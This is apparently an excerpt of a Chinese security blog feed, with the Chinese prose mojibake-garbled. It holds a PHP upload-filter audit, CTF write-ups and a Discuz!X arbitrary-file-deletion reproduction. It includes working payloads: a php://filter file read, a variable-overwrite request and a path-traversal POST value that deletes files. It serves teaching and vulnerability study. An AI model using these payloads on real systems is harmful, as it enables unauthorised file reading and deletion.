<pre><code class="php">#1691
            if (!is_uploadable($ATTACH_NAME)) &#123;
                $ERROR_DESC = sprintf(_(&quot;ç¦æ­¢ä¸Šä¼ åç¼€åä¸º[%s]çš„æ–‡ä»¶&quot;), substr($ATTACH_NAME, strrpos($ATTACH_NAME, &quot;.&quot;) + 1));
            &#125;
#1705
            if (preg_match(&quot;/[\&#39;:&lt;&gt;?]|\/|\\\\|\&quot;|\|/u&quot;, $ATTACH_NAME_UTF8)) &#123;
                $ERROR_DESC = sprintf(_(&quot;æ–‡ä»¶å[%s]åŒ…å«[/\&#39;\&quot;:*?&lt;&gt;|]ç­‰éæ³•å­—ç¬¦&quot;), $ATTACH_NAME);
            &#125;</code></pre>
<p>è¿™é‡Œè°ƒç”¨<code>is_uploadable</code>å‡½æ•°è¿›è¡Œä¸Šä¼ æ£€æŸ¥ã€‚</p>
<pre><code class="php">function is_uploadable($FILE_NAME)
&#123;
    $POS = strrpos($FILE_NAME, &quot;.&quot;);

    if ($POS === false) &#123;
        $EXT_NAME = $FILE_NAME;
    &#125;
    else &#123;
        if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == &quot;php&quot;) &#123;
            return false;
        &#125;

        $EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));
    &#125;

    if (find_id(MYOA_UPLOAD_FORBIDDEN_TYPE, $EXT_NAME)) &#123;
        return false;
    &#125;</code></pre>
<p>å‡½æ•°ä¸­å¯»æ‰¾æœ€åä¸€ä¸ª<code> .</code> çš„ä½ç½®åä¸‰ä¸ªå­—ç¬¦ï¼Œå°å†™åçœ‹æ˜¯å¦åŒ¹é…å­—ç¬¦â€™phpâ€™ï¼ŒåŒ¹é…åˆ™è¿”å›<code>false</code>ï¼Œè¿˜é€šè¿‡<code>find_id</code>å‡½æ•°è¿›è¡Œé»‘åå•çš„æ£€æŸ¥ã€‚</p>
<p>ç„¶åçœ‹ä¸€ä¸‹ä¿å­˜è·¯å¾„é—®é¢˜ï¼Œ<code>$UPLOAD_MODE</code>æ‰€éœ€è¦çš„<code>$ATTACHMENT_ID</code>ç­‰å‚æ•°æ¥è‡ªäº<code>$ATTACHMENTS</code>,è€Œ<code>$ATTACHMENTS</code>åˆ™æ˜¯è°ƒç”¨uploadå‡½æ•°çš„è¿”å›ç»“æœ:upload.php</p>
<pre><code class="php">#61    
  $ATTACHMENT_ID = substr($ATTACHMENTS[&quot;ID&quot;], 0, -1);
    $ATTACHMENT_NAME = substr($ATTACHMENTS[&quot;NAME&quot;], 0, -1);
#82
if ($UPLOAD_MODE == &quot;1&quot;) &#123;
    if (is_thumbable($ATTACHMENT_NAME)) &#123;
        $FILE_PATH = attach_real_path($ATTACHMENT_ID, $ATTACHMENT_NAME, $MODULE);
        $THUMB_FILE_PATH = substr($FILE_PATH, 0, strlen($FILE_PATH) - strlen($ATTACHMENT_NAME)) . &quot;thumb_&quot; . $ATTACHMENT_NAME;
        CreateThumb($FILE_PATH, 320, 240, $THUMB_FILE_PATH);
    &#125;</code></pre>
<p>inc/utility_file.phpæ–‡ä»¶1713è¡Œ</p>
<pre><code class="php">            if ($ERROR_DESC == &quot;&quot;) &#123;
                $ATTACH_NAME = str_replace(&quot;&#39;&quot;, &quot;&quot;, $ATTACH_NAME);
                $ATTACH_ID = add_attach($ATTACH_FILE, $ATTACH_NAME, $MODULE);

                if ($ATTACH_ID === false) &#123;
                    $ERROR_DESC = sprintf(_(&quot;æ–‡ä»¶[%s]ä¸Šä¼ å¤±è´¥&quot;), $ATTACH_NAME);
                &#125;
                else &#123;
                    $ATTACHMENTS[&quot;ID&quot;] .= $ATTACH_ID . &quot;,&quot;;
                    $ATTACHMENTS[&quot;NAME&quot;] .= $ATTACH_NAME . &quot;*&quot;;
                &#125;
            &#125;</code></pre>
<p><code>ATTACHMENTS[&quot;ID&quot;]</code>æ¥æºäºadd_attachå‡½æ•°ï¼Œä½äºinc/utility_file.phpæ–‡ä»¶1854è¡Œ</p>
<pre><code class="php">    $PATH = $ATTACH_PATH_ACTIVE . $MODULE;
    if (!file_exists($PATH) || !is_dir($PATH)) &#123;
        @mkdir($PATH, 448);
    &#125;

    $PATH = $PATH . &quot;/&quot; . $YM;
    if (!file_exists($PATH) || !is_dir($PATH)) &#123;
        @mkdir($PATH, 448);
    &#125;

$FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;

    if (file_exists($FILENAME)) &#123;
        $ATTACH_ID = mt_rand();
        $FILENAME = $PATH . &quot;/&quot; . $ATTACH_ID . &quot;.&quot; . $ATTACH_FILE;
    &#125;</code></pre>
<p>æœ‰<code>$PATH</code>å’Œ<code>$FILENAME</code>ï¼Œç„¶åçœ‹è¿”å›çš„å†…å®¹</p>
<pre><code class="php">    $ATTACH_ID_NEW = $AID . &quot;@&quot; . $YM . &quot;_&quot; . $ATTACH_ID;
    if (is_office($ATTACH_NAME) &amp;&amp; ($ATTACH_SIGN != 0)) &#123;
        $ATTACH_ID_NEW .= &quot;.&quot; . $ATTACH_SIGN;
    &#125;

    return $ATTACH_ID_NEW;</code></pre>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>æ¼æ´å¤ç°</tag>
      </tags>
  </entry>
  <entry>
    <title>é™•è¥¿çœç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WriteUp</title>
    <url>/2017/04/15/shan-xi-sheng-wang-luo-kong-jian-an-quan-ji-zhu-da-sai-writeup/</url>
    <content><![CDATA[<h1 id="é™•è¥¿çœç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WriteUp"><a href="#é™•è¥¿çœç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WriteUp" class="headerlink" title="é™•è¥¿çœç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WriteUp"></a>é™•è¥¿çœç½‘ç»œç©ºé—´å®‰å…¨æŠ€æœ¯å¤§èµ›WriteUp</h1><p>1.ç­¾åˆ°ï¼ˆ10åˆ†ï¼‰</p>
<p>base64è§£å¯†</p>
<p>2.<a href="http://117.34.111.15:84/">ç­¾åˆ°</a>ï¼ˆ50åˆ†ï¼‰</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/162802942.png" alt="mark"></p>
<p>çœ‹ä¸€ä¸‹æºç ~</p>
<pre><code>
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;ç™»å½•&lt;/title&gt;
    &lt;meta name=&quot;description&quot; content=&quot;slick Login&quot;&gt;
    &lt;meta name=&quot;author&quot; content=&quot;Webdesigntuts+&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;form&gt;
    &lt;div align=&quot;center&quot;&gt;
    &lt;p&gt;Username: &lt;input type=&quot;text&quot; name=&quot;Username&quot; id=&quot;Username&quot; size=&quot;25&quot; required/&gt;&lt;/p&gt;
    &lt;p&gt;Password: &lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; size=&quot;25&quot; required/&gt;&lt;/p&gt;
    &lt;p&gt;&lt;input type=&quot;submit&quot; class=&quot;small button&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;Submit&quot;/&gt;&lt;br/&gt;&lt;/p&gt;
    &lt;/form&gt;

     &lt;!--  if (isset($_GET[&#39;Username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;])) &#123;
           $logined = true;
        $Username = $_GET[&#39;Username&#39;];
        $password = $_GET[&#39;password&#39;];

        if (!ctype_alpha($Username)) &#123;$logined = false;&#125;
        if (!is_numeric($password) ) &#123;$logined = false;&#125;
        if (md5($Username) != md5($password)) &#123;$logined = false;&#125;

        if ($logined)&#123;
            echo &quot;successful&quot;;
        &#125; else &#123;
            echo &quot;login failed!&quot;;
        &#125;
    &#125;
--&gt;
&lt;/body&gt;

&lt;/html&gt;

</code></pre>
<p>å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œçš„è¦æ±‚æ˜¯ï¼š</p>
<p>ï¼ˆ1ï¼‰usernameæ˜¯å­—æ¯</p>
<p>ï¼ˆ2ï¼‰passwordæ˜¯æ•°å­—</p>
<p>ï¼ˆ3ï¼‰2è€…çš„md5çš„==åˆ¤æ–­ä¸ºtrue</p>
<p>è¿™é‡Œçš„å…³é”®åœ¨äºæ¾æ•£æ¯”è¾ƒï¼Œå¦‚æœ<code>0e</code> å¼€å¤´çš„ï¼Œåˆæ˜¯ç”¨çš„ <code>==</code> ï¼Œå¯ä»¥åªåˆ¤æ–­å‰ä¸¤ä½ï¼Œä¹‹åçš„åªè¦éƒ½æ˜¯æ•°å­—å°±å¯ä»¥ã€‚</p>
<p>çº¯æ•°å­—md5ï¼š240610708 </p>
<p>çº¯å­—æ¯md5ï¼šQNKCDZO</p>
<p>å¯ä»¥å†™è„šæœ¬è·‘ï¼Œæœ€å¥½å¹³æ—¶è·‘å¥½æ”¶é›†èµ·æ¥ã€‚</p>
<pre><code>&lt;?php
for ($flag = 240000000; $flag &lt;= 249999999; $flag++) &#123;
        if (md5($flag) == md5(&#39;QNKCDZO&#39;))&#123;
            echo $flag.&quot;/&quot;;
        &#125;
&#125;

?&gt;</code></pre>
<p>submit,ç„¶åã€‚ã€‚ã€‚ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/164801541.png" alt="mark"></p>
<p>æºç æºç ~</p>
<pre><code>
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;&gt;
    &lt;title&gt;qiang&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;form&gt;
    &lt;div align=&quot;center&quot;&gt;
    &lt;h2&gt;å“ˆå“ˆï¼Œä»¥ä¸ºè¿™æ ·å°±å®Œäº†å—ï¼Ÿï¼å¹¶æ²¡æœ‰ï¼Œæ¥ç€å¥‹æ–—å§ï¼Œå°‘å¹´ï¼&lt;/h2&gt;
    &lt;/form&gt;

     &lt;!--  if (isset($_POST[&#39;message&#39;])) &#123;
    $message = json_decode($_POST[&#39;message&#39;]);
    $key =&quot;*********&quot;;
    if ($message-&gt;key == $key) &#123;
        echo &quot;flag&quot;;
    &#125; 
    else &#123;
        echo &quot;fail&quot;;
    &#125;
 &#125;
 else&#123;
     echo &quot;~~~~&quot;;
 &#125;
--&gt;
&lt;/body&gt;

&lt;/html&gt;
â€‹~~~~</code></pre>
<p>ç™¾åº¦äº†è§£ä¸€äº›<a href="http://www.jb51.net/article/30489.htm">json_decode</a>,æ„é€ postã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/165051531.png" alt="mark"></p>
<p>åŸç†å‘¢å¦‚ä¸‹</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170415/165118693.png" alt="mark"></p>
<p>å¾—åˆ°flagï¼šflag{sffs_gsg_suhs}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>é¹åŸæ¯2018Writeup</title>
    <url>/2018/12/02/peng-cheng-bei-2018writeup/</url>
    <content><![CDATA[<blockquote>
<p>Webç‹—æ²¡æœ‰æ´»è·¯å•¦ (â•¯Â°Ğ”Â°)â•¯ï¸µ â”»â”â”»</p>
</blockquote>
<a id="more"></a>

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="myblog"><a href="#myblog" class="headerlink" title="myblog"></a>myblog</h3><p>index.phpçš„headerä¸­æœ‰<code>flag: JTNGZmxhZw==</code>ï¼Œè§£base64å¾—åˆ°å‚æ•°<code>%3Fflag</code>ï¼ŒçŒœæµ‹index.phpå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œè¿ç”¨flagå‚æ•°è¯»æ–‡ä»¶ã€‚</p>
<p>payload:<code>PD9waHAgDQoJaGVhZGVyKCdmbGFnOiBKVE5HWm14aFp3PT0nKTsNCglpZihpc3NldCgkX0dFVFsiZmxhZyJdKSl7DQoJCSRmbGFnID0gJF9HRVRbImZsYWciXTsNCgkJaW5jbHVkZSAkZmxhZy4iLnBocCI7DQoJfQ0KPz4=</code></p>
<pre><code class="php">&lt;?php
    header(&#39;flag: JTNGZmxhZw==&#39;);
    if(isset($_GET[&quot;flag&quot;]))&#123;
        $flag = $_GET[&quot;flag&quot;];
        include $flag.&quot;.php&quot;;
    &#125;
?&gt;</code></pre>
<p>æç¤ºaboutyouåç«¯ï¼Œabouté‡Œä¹Ÿæåˆ°äº†base64ï¼ŒçŒœæµ‹å­˜åœ¨<code>YWJvdXQ=.php</code></p>
<p>payload:<code>http://58.20.46.150:26293/index.php?flag=php://filter/convert.base64-encode/resource=YWJvdXQ=</code></p>
<pre><code class="php">&lt;?php

    $filename = &#39;flag.txt&#39;;
    $flag = &#39;flag.txt&#39;;
    extract($_GET);

    if(isset($sign))&#123;
        $file = trim(file_get_contents($filename));
        if($sign === $file)&#123;
            echo &#39;Congratulation!&lt;br&gt;&#39;;
            echo file_get_contents($$falg);
        &#125;
        else&#123;
            echo &#39;don`t give up&#39;;
        &#125;
    &#125;

?&gt;</code></pre>
<p>å˜é‡è¦†ç›–+ä¼ªåè®®ï¼Œè®©<code>$sign=a</code>ï¼Œ<code>$file</code>ä¸ºpostè¾“å…¥ï¼Œè®©$falgä¸ºflagè¯»å–æ–‡ä»¶ã€‚</p>
<p>payload:<code>http://58.20.46.150:26293/YWJvdXQ=.php?sign=a&amp;filename=php://input&amp;falg=flag</code>(post:a)</p>
<p><img src="/images/pcb2018/myblog.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="easyCrypto"><a href="#easyCrypto" class="headerlink" title="easyCrypto"></a>easyCrypto</h3><p>åœ¨æœç´¢è¿‡ç¨‹ä¸­æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/2830">https://xz.aliyun.com/t/2830</a></p>
<p>ä»–çš„é¢˜ç›®çš„è„šæœ¬ä¸­å’Œæœ¬é¢˜çš„åŠ å¯†ç®—æ³•å·®ä¸å¤šï¼Œæ‹¿ä»–é¢˜ç›®çš„è§£å¯†ç®—æ³•æ”¹äº†ä¸€ä¸‹ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼ˆç›´æ¥æ”¹çš„é¢˜ç›®è„šæœ¬ï¼‰ï¼š</p>
<pre><code class="python">#!usr/bin/python 
#_*_ coding=UTF-8 _*_

from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex
from Crypto import Random
import sys
#from FLAG import flag

class aesdemo:
    #aes = AES.new(key,mode)
    def __init__(self,key):
        self.key = key
        #self.BS=BS


    def pad(self,msg):
        #BS = AES.block_size 
        # aesæ•°æ®åˆ†ç»„é•¿åº¦ä¸º128 bit
        byte = 16 - len(msg) % 16
        return msg + chr(byte) * byte
    def unpad(self,msg):
        if not msg:
            return &#39;&#39;
        return msg[:-ord(msg[-1])]        

    def xor(self,a, b):
            #assert len(a) == len(b)
            return &#39;&#39;.join([chr(ord(ai)^ord(bi)) for ai, bi in zip(a,b)])

    def split_by(self,data,step):
            return [data[i : i+step] for i in xrange(0, len(data), step)]


    def tsb_decrypt(self, msg):
        iv, msg = msg[:16], msg[16:]
        a = b2a_hex(iv)
        prev_pt = iv
        prev_ct = iv
        pt = &#39;&#39;
        aes = AES.new(self.key,AES.MODE_CBC,iv)
        for block in self.split_by(msg, 16):
            pt_block = self.xor(block, prev_ct)
            pt_block = aes.decrypt(pt_block)
            pt_block = self.xor(pt_block, prev_pt)
            pt += pt_block

        print pt
        print self.unpad(pt)

# æµ‹è¯•æ¨¡å—
if __name__ == &#39;__main__&#39;:
    BS = AES.block_size # aesæ•°æ®åˆ†ç»„é•¿åº¦ä¸º128 bit
    key=&quot;asdfghjkl1234567890qwertyuiopzxc&quot;
    enc = &#39;524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa&#39;
    demo = aesdemo(key)
    #e = demo.encrypt(flag)
    #print(&quot;åŠ å¯†ï¼š&quot;, e)

    demo.tsb_decrypt(a2b_hex(enc))
    #print f


</code></pre>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Traffic-Light"><a href="#Traffic-Light" class="headerlink" title="Traffic Light"></a>Traffic Light</h3><p>ä¸¤ç§é¢œè‰²çš„ç¯ï¼Œæ¯8ä¸ªä¼šå‡ºç°æ²¡çœ¼è‰²çš„æ¥åˆ†å‰²ã€‚çŒœæµ‹è¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®ã€‚</p>
<p>è„šæœ¬å°†äºŒè‰²ç¯è½¬æ¢ä¸º1å’Œ0ã€‚</p>
<p>è„šæœ¬ï¼š</p>
<pre><code class="python">from PIL import Image, ImageSequence

image = Image.open(&#39;Traffic_Light.gif&#39;)
iter = ImageSequence.Iterator(image)

flag = &#39;&#39;
tmp = &#39;&#39;


for i in range(0,1168,2):
  img = iter[i].convert(&#39;RGB&#39;)
  light1 = img.getpixel((112, 50))
  light2 = img.getpixel((112, 150))
  if str(light2) == &#39;(0, 255, 0)&#39;:
    tmp += &#39;0&#39;
  if str(light1) == &#39;(255, 0, 0)&#39;:
    tmp += &#39;1&#39;
  if len(tmp) == 8:
    #print tmp
    flag += chr(int(tmp, 2))
    tmp = &#39;&#39;

print(flag)
</code></pre>
<h3 id="Quotes"><a href="#Quotes" class="headerlink" title="Quotes"></a>Quotes</h3><blockquote>
<p>My+mission+in+life+is+not+mer ely+to+survive+but to+thrive+and+to+do+so+w ith+s  ome+pass i on+some+compass ion+so me+humor+and+some+style</p>
</blockquote>
<p>åˆ†ç»„äº†ï¼Œè€Œä¸”æ¯ç»„ä¸ç®—+çš„é•¿åº¦ä¸è¶…è¿‡26ï¼ŒçŒœæµ‹å¯¹åº”26ä¸ªå­—æ¯ï¼Œå¥ˆä½•åˆšå¼€å§‹å†™è„šæœ¬å¤šå†™äº†ä¸ª+1ï¼Œç—›å¤±äºŒè¡€ã€‚</p>
<p>è„šæœ¬ï¼š</p>
<pre><code class="python">pos = &#39;23 15 18 4 7 1 13 5 19&#39;.split(&#39; &#39;)

flag = &#39;&#39;

for i in pos:
    flag += chr(int(i)+96)

print flag
</code></pre>
<p>æäº¤çš„falgä¸ºï¼šflag{word games}</p>
<h3 id="Whatâ€™s-this"><a href="#Whatâ€™s-this" class="headerlink" title="Whatâ€™s_this"></a>Whatâ€™s_this</h3><p>æŒºéº»çƒ¦çš„ä¸ªé¢˜= =</p>
<p>é¢˜ç›®æ–‡ä»¶æ˜¯ä¸ªå›¾ç‰‡ï¼Œbinwalkæå–å¾—åˆ°<code>1-stage.docx 2-stage.what 7A160.zip    EE548.zip    zip2.zip</code></p>
<p>1-stage.docxæœ‰éšè—æ–‡å­—ï¼Œæ‹¿å‡ºæ¥å’Œ zip2.zipè¿›è¡Œæ˜æ–‡æ”»å‡»ï¼Œå¾—åˆ°å¯†ç <code>Hello_Hi</code>ã€‚</p>
<p><img src="/images/pcb2018/whatis.png"></p>
<p>è§£å‹å¾—åˆ°<code>2-stage         flowerdance.txt</code></p>
<p>æ ¹æ®æç¤ºç”¨cloacked-pixelæå–å‡ºéšè—çš„æ–‡ä»¶ï¼Œæ˜¯ä¸ªzipã€‚</p>
<p>è§£å‹zipå¾—åˆ°zip3å’Œzip4ï¼Œéƒ½æ˜¯åŠ å¯†æ–‡ä»¶</p>
<p>zip3çš„æ–‡ä»¶åªæœ‰4Bï¼Œé‡‡ç”¨CRCçˆ†ç ´å¾—åˆ°å†…å®¹<code>girl</code></p>
<p>è„šæœ¬ï¼š</p>
<pre><code class="python">import binascii
import base64
import string
import itertools
import struct

alph = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=&#39;

crcdict = &#123;&#125;
print &quot;computing all possible CRCs...&quot;
for x in itertools.product(list(alph), repeat=4):
    st = &#39;&#39;.join(x)
    testcrc = binascii.crc32(st)
    crcdict[struct.pack(&#39;&lt;i&#39;, testcrc)] = st
print &quot;Done!&quot;

f = open(&#39;zip3.zip&#39;)
data = f.read()
f.close()
crc = &#39;&#39;.join(data[14:18])
if crc in crcdict:
    print crcdict[crc]
else:
    print &quot;FAILED!&quot;</code></pre>
<p>ç”¨girlè§£å‹zip4å¾—åˆ°äº†fake_flagå’Œ<code>what&#39;s next.txt</code></p>
<p>å› ä¸º<code>what&#39;s next.txt</code>å’Œ<code>zip4</code>çš„æ•°æ®é•¿åº¦ä¸€æ ·ï¼Œè¿›è¡Œå¼‚æˆ–åå¾—åˆ°æ–°çš„zipè§£å‹å¾—åˆ°flagã€‚</p>
<pre><code class="python">file1 = open(&#39;I_Love_You.emf&#39;,&#39;rb&#39;)
#file2 = open(&quot;what&#39;s next.txt&quot;,&#39;rb&#39;)
flag = open(&quot;flag&quot;,&#39;wb&#39;)
file3 = open(&#39;zip4.zip&#39;, &#39;rb&#39;)
f1 = file1.read()
#f2 = file2.read()
f3 = file3.read()
print len(f1),len(f3)
out = &#39;&#39;
for i in range(len(f3)):
    out += chr(ord(f1[i])^ord(f3[i]))

with open(&#39;flag.zip&#39;, &#39;w&#39;) as f:
    f.write(out)</code></pre>
<h3 id="GreatWall"><a href="#GreatWall" class="headerlink" title="GreatWall"></a>GreatWall</h3><p>Strgosolveæå–è½¬å­˜äºŒè¿›åˆ¶æ•°æ®.</p>
<p><img src="/images/pcb2018/greatwall1.png"></p>
<p>ç”¨foremostæå–å‡ºçš„å›¾ç‰‡,æ”¾å¤§å›¾ç‰‡å‘ç°æœ€ä¸Šé¢æœ‰è«æ–¯ç”µç </p>
<p><code>/-.-..--/---.-../--..--/--..---/--.-../--.---./--..../--..---/---..-./--.-../---..../--.-.../----..-/-.-----/--...-/---..--/-.-----/--...-/--.---./---.-../--..--/---..-./--..--/---..--/---.-../--...-/--.---./--..---/</code></p>
<p>è§£ç å¾—åˆ°</p>
<p><code>%u53%u74,%u67%u34%u6e%u30%u67%u72%u34%u70%u68%u79%u5f%u31%u73%u5f%u31%u6e%u74,%u72,%u73%u74%u31%u6e%u67</code></p>
<p>%æ›¿æ¢æˆ\è§£unicode</p>
<p>è¦æ³¨æ„çš„æ˜¯è¿˜æœ‰ä»¨é€—å·ã€‚ã€‚æ ¹æ®è¯­ä¹‰ï¼Œæ›¿æ¢æˆeä¸å¯¹æ›¿æ¢æˆ3å¯¹äº†ã€‚</p>
<p><img src="/images/pcb2018/greatwall2.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Dzç³»åˆ—æ¼æ´</title>
    <url>/2020/03/23/dz-xi-lie-lou-dong/</url>
    <content><![CDATA[<h2 id="Discuz-X-â‰¤3-4-ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"><a href="#Discuz-X-â‰¤3-4-ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´" class="headerlink" title="Discuz!X â‰¤3.4 ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´"></a>Discuz!X â‰¤3.4 ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´</h2><h3 id="1ã€ç®€è¿°"><a href="#1ã€ç®€è¿°" class="headerlink" title="1ã€ç®€è¿°"></a>1ã€ç®€è¿°</h3><p><strong>æ¼æ´åŸå› ï¼š</strong>ä¹‹å‰å­˜åœ¨çš„ä»»æ„æ–‡ä»¶åˆ é™¤æ¼æ´ä¿®å¤ä¸å®Œå…¨å¯¼è‡´å¯ä»¥ç»•è¿‡ã€‚</p>
<p><strong>æ¼æ´ä¿®å¤æ—¶é—´ï¼š</strong>2017å¹´9æœˆ29æ—¥å®˜æ–¹å¯¹giteeä¸Šçš„ä»£ç è¿›è¡Œäº†<a href="https://gitee.com/ComsenzDiscuz/DiscuzX/commit/7d603a197c2717ef1d7e9ba654cf72aa42d3e574">ä¿®å¤</a></p>
<h3 id="2ã€å¤ç°ç¯å¢ƒ"><a href="#2ã€å¤ç°ç¯å¢ƒ" class="headerlink" title="2ã€å¤ç°ç¯å¢ƒ"></a>2ã€å¤ç°ç¯å¢ƒ</h3><p>å› ä¸ºå®˜æ–¹æä¾›çš„ä¸‹è½½æ˜¯æœ€æ–°çš„æºç ï¼Œæ¼æ´ä¿®å¤æ—¶é—´æ˜¯17å¹´9æœˆ29æ—¥ï¼Œé€šè¿‡gitæ‰¾ä¸€ä¸ªä¿®å¤å‰çš„ç‰ˆæœ¬ç­¾å‡ºå°±å¯ã€‚</p>
<pre><code>git checkout 1a912ddb4a62364d1736fa4578b42ecc62c5d0be</code></pre>
<p>é€šè¿‡å®‰è£…å‘å¯¼å®‰è£…å®Œåæ³¨å†Œä¸€ä¸ªæµ‹è¯•ç”¨æˆ·ï¼ŒåŒæ—¶åœ¨ç½‘ç«™å¯¹åº”ç›®å½•ä¸‹åˆ›å»ºç”¨äºåˆ é™¤çš„æµ‹è¯•æ–‡ä»¶ã€‚</p>
<h3 id="3ã€æ¼æ´å¤ç°"><a href="#3ã€æ¼æ´å¤ç°" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>ç™»å½•è´¦æˆ·ã€‚</p>
<p>è®¿é—®è¯¥ç½‘é¡µï¼š<code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base</code></p>
<p>å‘é€POSTè¯·æ±‚ï¼š</p>
<pre><code>http://127.0.0.1:8001/dz/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base
POST
birthprovince=../../../testfile.txt&amp;profilesubmit=1&amp;formhash=e9d84225
formhashå€¼ä¸ºç”¨æˆ·hashï¼Œå¯åœ¨æºç ä¸­æœç´¢formhashæ‰¾åˆ°ã€‚</code></pre>
<p>è¯·æ±‚åè¡¨å•ä¸­çš„å‡ºç”Ÿåœ°å†…å®¹å˜ä¸º<code>../../../testfile.txt</code></p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/1.png"></p>
<p>ç„¶åæ„é€ è¯·æ±‚å‘<code>home.php?mod=spacecp&amp;ac=profile&amp;op=base</code>ä¸Šä¼ æ–‡ä»¶ï¼Œå¯ä»¥ä¿®æ”¹è¡¨å•æäº¤è¾¾åˆ°ç›®çš„ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/3.png"></p>
<p>æäº¤åæ–‡ä»¶è¢«åˆ é™¤ã€‚</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/dz_3.4_%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/2.png"></p>
<h3 id="4ã€æ¼æ´åˆ†æ"><a href="#4ã€æ¼æ´åˆ†æ" class="headerlink" title="4ã€æ¼æ´åˆ†æ"></a>4ã€æ¼æ´åˆ†æ</h3><p>åˆ†æä¸€ä¸‹å¯¹è¯¥é¡µé¢è¯·æ±‚æ—¶çš„æµç¨‹ã€‚</p>
<p>åœ¨<code>home.php</code>çš„41è¡Œæœ‰ä¸€æ¬¡å¯¹å…¶ä»–æ–‡ä»¶çš„è¯·æ±‚ï¼š</p>
<pre><code class="php">require_once libfile(&#39;home/&#39;.$mod, &#39;module&#39;);</code></pre>
<p>å› ä¸ºGETå‚æ•°ä¸æ»¡è¶³ä¸Šé¢ä»£ç çš„æ¡ä»¶æ‰€ä»¥è¿›å…¥è¿™éƒ¨åˆ†ã€‚</p>
<p>æŸ¥çœ‹libfileå‡½æ•°çš„å®šä¹‰ï¼š</p>
<pre><code class="php">function libfile($libname, $folder = &#39;&#39;) &#123;
    $libpath = &#39;/source/&#39;.$folder;
    if(strstr($libname, &#39;/&#39;)) &#123;
        list($pre, $name) = explode(&#39;/&#39;, $libname);
        $path = &quot;&#123;$libpath&#125;/&#123;$pre&#125;/&#123;$pre&#125;_&#123;$name&#125;&quot;;
    &#125; else &#123;
        $path = &quot;&#123;$libpath&#125;/&#123;$libname&#125;&quot;;
    &#125;
    return preg_match(&#39;/^[\w\d\/_]+$/i&#39;, $path) ? realpath(DISCUZ_ROOT.$path.&#39;.php&#39;) : false;
&#125;</code></pre>
<p>å¯ä»¥çœ‹å‡ºè¯¥å‡½æ•°çš„åŠŸèƒ½å°±æ˜¯æ„é€ æ–‡ä»¶è·¯å¾„ã€‚</p>
<p>å¯¹äºå¤ç°æ¼æ´æ—¶è¯·æ±‚é¡µé¢çš„GETè¯·æ±‚å‚æ•°ï¼š<code>mod=spacecp&amp;ac=profile&amp;op=base</code></p>
<p>åœ¨å¦‚ä¸Šå‚æ•°çš„è¯·æ±‚æ—¶ï¼Œç»è¿‡<code>libfile</code>å‡½æ•°å¤„ç†è¿‡åè¿”å›çš„è·¯å¾„ä¸º:<code>/source/module/home/home_spacecp.php</code></p>
